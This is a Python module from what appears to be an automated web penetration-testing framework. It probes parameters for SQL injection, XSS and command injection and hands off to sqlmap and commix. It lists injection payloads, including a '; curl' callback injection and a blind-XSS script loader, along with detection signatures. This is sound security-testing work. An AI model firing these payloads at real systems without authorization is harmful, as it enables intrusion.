# wstg_orchestrator/modules/input_validation.py
import re
import time
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from wstg_orchestrator.modules.base_module import BaseModule
from wstg_orchestrator.utils.command_runner import CommandRunner


class InputValidationModule(BaseModule):
    PHASE_NAME = "input_validation"
    SUBCATEGORIES = ["sqli_testing", "xss_testing", "command_injection"]
    EVIDENCE_SUBDIRS = [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ]

    SQLI_ERROR_PAYLOADS = [
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "1' OR '1'='1'--",
        "' UNION SELECT NULL--", "1; SELECT 1--", "' AND 1=1--",
        "' AND 1=2--", "admin'--",
    ]

    SQLI_TIME_PAYLOADS = [
        "' OR SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--",
        "' OR pg_sleep(3)--", "1' AND SLEEP(3)--",
    ]

    SQLI_ERROR_SIGNATURES = [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
        r"valid MySQL result", r"pg_query\(\)", r"PostgreSQL.*ERROR",
        r"ORA-\d{5}", r"Oracle.*Driver", r"Microsoft.*SQL.*Server",
        r"ODBC SQL Server Driver", r"SQLite.*error", r"sqlite3\.OperationalError",
        r"Unclosed quotation mark", r"quoted string not properly terminated",
    ]

    XSS_PAYLOADS = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        "javascript:alert(1)",
        '<body onload=alert(1)>',
        # WAF bypass variants
        '<ScRiPt>alert(1)</ScRiPt>',
        '<img src=x oNeRrOr=alert(1)>',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '<svg/onload=alert(1)>',
    ]

    CMDI_PAYLOADS = [
        "; id", "| id", "|| id", "&& id", "`id`", "$(id)",
        "; whoami", "| whoami", "& whoami",
    ]

    CMDI_TIME_PAYLOADS = [
        "; sleep 3", "| sleep 3", "|| sleep 3", "&& sleep 3",
        "; ping -c 3 127.0.0.1", "| ping -c 3 127.0.0.1",
    ]

    CMDI_SIGNATURES = [
        r"uid=\d+\(", r"root:", r"www-data", r"nobody",
    ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._cmd = CommandRunner(
            tool_configs={
                name: self.config.get_tool_config(name)
                for name in ["sqlmap", "commix"]
            }
        )

    async def execute(self):
        if not self.should_skip_subcategory("sqli_testing"):
            await self._sqli_testing()
            self.mark_subcategory_complete("sqli_testing")

        if not self.should_skip_subcategory("xss_testing"):
            await self._xss_testing()
            self.mark_subcategory_complete("xss_testing")

        if not self.should_skip_subcategory("command_injection"):
            await self._command_injection()
            self.mark_subcategory_complete("command_injection")

    async def _sqli_testing(self):
        self.logger.info("Starting SQL injection testing")
        parameters = self.state.get("parameters") or []

        for param in parameters:
            url = param.get("url", "")
            name = param.get("name", "")
            method = param.get("method", "GET")

            # Error-based probes
            for payload in self.SQLI_ERROR_PAYLOADS:
                try:
                    resp = self._inject_param(url, name, payload, method)
                    for sig in self.SQLI_ERROR_SIGNATURES:
                        if re.search(sig, resp.text, re.I):
                            self.evidence.log_potential_exploit("input_validation", {
                                "type": "sqli_error_based",
                                "url": url, "parameter": name,
                                "payload": payload, "signature": sig,
                                "severity": "critical",
                            })
                            self.state.enrich("potential_vulnerabilities", [{
                                "type": "sqli",
                                "url": url,
                                "severity": "critical",
                                "description": f"Error-based SQLi in param '{name}' with payload: {payload}",
                            }])
                            # Hand off to sqlmap for confirmation
                            await self._run_sqlmap(url, name, method)
                            break
                except Exception:
                    continue

            # Time-based probes
            for payload in self.SQLI_TIME_PAYLOADS:
                try:
                    start = time.monotonic()
                    resp = self._inject_param(url, name, payload, method)
                    elapsed = time.monotonic() - start
                    if elapsed >= 2.5:
                        self.evidence.log_potential_exploit("input_validation", {
                            "type": "sqli_time_based",
                            "url": url, "parameter": name,
                            "payload": payload, "delay": elapsed,
                            "severity": "critical",
                        })
                        self.state.enrich("potential_vulnerabilities", [{
                            "type": "sqli_time_based",
                            "url": url,
                            "severity": "critical",
                            "description": f"Time-based SQLi in param '{name}' (delay: {elapsed:.1f}s)",
                        }])
                        await self._run_sqlmap(url, name, method)
                        break
                except Exception:
                    continue

    async def _run_sqlmap(self, url: str, param: str, method: str):
        if not self._cmd.is_tool_available("sqlmap"):
            self.logger.warning("sqlmap not found, skipping automated exploitation")
            return

        args = ["-u", f"{url}?{param}=test" if method == "GET" else url,
                "-p", param, "--batch", "--level=2", "--risk=1",
                "--output-dir=/tmp/sqlmap_output", "--smart"]

        if method == "POST":
            args.extend(["--method=POST", f"--data={param}=test"])

        result = self._cmd.run("sqlmap", args, timeout=300)
        if result.returncode == 0:
            self.evidence.log_tool_output("input_validation", "sqlmap", result.stdout)

    async def _xss_testing(self):
        self.logger.info("Starting XSS testing")
        parameters = self.state.get("parameters") or []

        for param in parameters:
            url = param.get("url", "")
            name = param.get("name", "")
            method = param.get("method", "GET")

            for payload in self.XSS_PAYLOADS:
                try:
                    resp = self._inject_param(url, name, payload, method)
                    if payload in resp.text:
                        self.evidence.log_potential_exploit("input_validation", {
                            "type": "xss_reflected",
                            "url": url, "parameter": name,
                            "payload": payload,
                            "severity": "high",
                            "context": self._detect_xss_context(resp.text, payload),
                        })
                        self.state.enrich("potential_vulnerabilities", [{
                            "type": "xss_reflected",
                            "url": url,
                            "severity": "high",
                            "description": f"Reflected XSS in param '{name}' with payload: {payload}",
                        }])
                        break  # Found one, move to next param
                except Exception:
                    continue

            # Blind XSS via callback server
            callback_url, token = self.callback.generate_callback(
                module="input_validation",
                parameter=name,
                payload="blind_xss",
            )
            blind_payload = f'"><script src="{callback_url}"></script>'
            try:
                self._inject_param(url, name, blind_payload, method)
            except Exception:
                pass

    def _detect_xss_context(self, body: str, payload: str) -> str:
        idx = body.find(payload)
        if idx == -1:
            return "unknown"
        context = body[max(0, idx - 50):idx + len(payload) + 50]
        if re.search(r'<script[^>]*>', context[:50], re.I):
            return "script_block"
        if re.search(r'<[^>]+$', context[:50]):
            return "html_attribute"
        return "html_body"

    async def _command_injection(self):
        self.logger.info("Starting command injection testing")
        parameters = self.state.get("parameters") or []

        for param in parameters:
            url = param.get("url", "")
            name = param.get("name", "")
            method = param.get("method", "GET")

            # Direct output detection
            for payload in self.CMDI_PAYLOADS:
                try:
                    resp = self._inject_param(url, name, payload, method)
                    for sig in self.CMDI_SIGNATURES:
                        if re.search(sig, resp.text):
                            self.evidence.log_confirmed_exploit("input_validation", {
                                "type": "command_injection",
                                "url": url, "parameter": name,
                                "payload": payload,
                                "severity": "critical",
                                "output_snippet": resp.text[:500],
                            })
                            self.state.enrich("confirmed_vulnerabilities", [{
                                "type": "command_injection",
                                "url": url,
                                "severity": "critical",
                                "description": f"Command injection in param '{name}'",
                                "reproduction_steps": f"1. Send {method} to {url}\n2. Set {name}={payload}",
                                "impact": "Remote code execution on the server",
                                "mitigation": "Never pass user input to shell commands. Use parameterized APIs.",
                            }])
                            break
                except Exception:
                    continue

            # Time-based detection
            for payload in self.CMDI_TIME_PAYLOADS:
                try:
                    start = time.monotonic()
                    self._inject_param(url, name, payload, method)
                    elapsed = time.monotonic() - start
                    if elapsed >= 2.5:
                        self.evidence.log_potential_exploit("input_validation", {
                            "type": "command_injection_blind",
                            "url": url, "parameter": name,
                            "payload": payload, "delay": elapsed,
                            "severity": "critical",
                        })
                        self.state.enrich("potential_vulnerabilities", [{
                            "type": "command_injection_blind",
                            "url": url,
                            "severity": "critical",
                            "description": f"Blind command injection in '{name}' (delay: {elapsed:.1f}s)",
                        }])
                        break
                except Exception:
                    continue

            # DNS-based blind detection via callback
            callback_url, token = self.callback.generate_callback(
                module="input_validation", parameter=name, payload="cmdi_blind",
            )
            dns_payload = f"; curl {callback_url}"
            try:
                self._inject_param(url, name, dns_payload, method)
            except Exception:
                pass

        # Commix handoff
        if self._cmd.is_tool_available("commix"):
            for param in parameters[:5]:
                url = param.get("url", "")
                name = param.get("name", "")
                result = self._cmd.run(
                    "commix",
                    ["--url", f"{url}?{name}=test", "--batch", "--level=2"],
                    timeout=120,
                )
                if result.returncode == 0:
                    self.evidence.log_tool_output("input_validation", "commix", result.stdout)

    def _inject_param(self, url: str, param_name: str, payload: str, method: str = "GET"):
        from wstg_orchestrator.utils.http_utils import HttpClient
        client = HttpClient(
            scope_checker=self.scope,
            rate_limiter=self.rate_limiter,
            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
        )
        if method.upper() == "GET":
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param_name] = payload
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, new_query, parsed.fragment))
            return client.get(test_url)
        else:
            return client.post(url, data={param_name: payload})